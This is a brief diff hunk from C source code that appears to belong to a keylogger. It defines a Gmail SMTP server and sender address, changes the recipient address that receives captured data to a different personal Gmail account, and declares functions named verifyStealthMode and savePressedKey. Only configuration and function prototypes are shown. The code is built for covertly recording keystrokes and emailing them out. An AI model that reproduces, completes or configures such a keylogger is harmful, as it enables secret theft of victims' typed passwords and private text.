@@ -18,7 +18,7 @@
 // Email sender defines:
 #define GMAIL_SERVER "gmail-smtp-in.l.google.com"
 #define EMAIL_FROM "tester@gmail.com"
-#define EMAIL_TO "includecoffee@gmail.com"
+#define EMAIL_TO "wickpunk@gmail.com"
 
 void verifyStealthMode();
 void savePressedKey(char pressedKey, char fileName[]);
